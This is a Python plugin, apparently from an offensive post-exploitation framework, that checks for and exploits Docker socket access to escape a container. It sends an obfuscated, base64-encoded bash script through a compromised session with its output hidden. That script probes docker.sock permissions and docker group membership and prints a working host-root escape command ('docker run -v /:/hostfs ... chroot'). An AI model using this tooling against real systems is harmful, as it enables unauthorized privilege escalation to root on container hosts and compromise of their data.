"""Docker socket escape detector and exploiter."""

from ..base import OperatorScript, ScriptResult


class DockerSocketEscape(OperatorScript):
    """Detect and exploit docker.sock access."""
    
    name = "Docker Socket Escape"
    description = "Detect docker.sock and provide escape commands"
    category = "escalate"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] DOCKER SOCKET ESCAPE DETECTOR"
echo "================================="
echo ""

if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket found: /var/run/docker.sock"
    ls -la /var/run/docker.sock
    echo ""
    
    if [ -r /var/run/docker.sock ]; then
        echo "[!] CRITICAL: Docker socket is readable!"
    fi
    
    if [ -w /var/run/docker.sock ]; then
        echo "[!] CRITICAL: Docker socket is writable - INSTANT ROOT POSSIBLE"
        echo ""
        echo "[*] Escape payload:"
        echo "  docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"
        echo ""
    fi
else
    echo "[-] Docker socket not found at /var/run/docker.sock"
fi

groups | grep docker >/dev/null 2>&1 && {
    echo "[!] User is in docker group - can use socket"
}

which docker >/dev/null 2>&1 && {
    echo "[+] Docker client installed"
    docker ps 2>/dev/null && {
        echo "[!] Docker access confirmed - escape possible"
        echo ""
        echo "[*] Running containers:"
        docker ps
    }
}

echo ""
echo "[*] Checking for container runtime:"
which podman >/dev/null 2>&1 && echo "[+] Podman installed"
which cri-ctl >/dev/null 2>&1 && echo "[+] cri-ctl installed"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Checking Docker socket...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Docker socket check executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
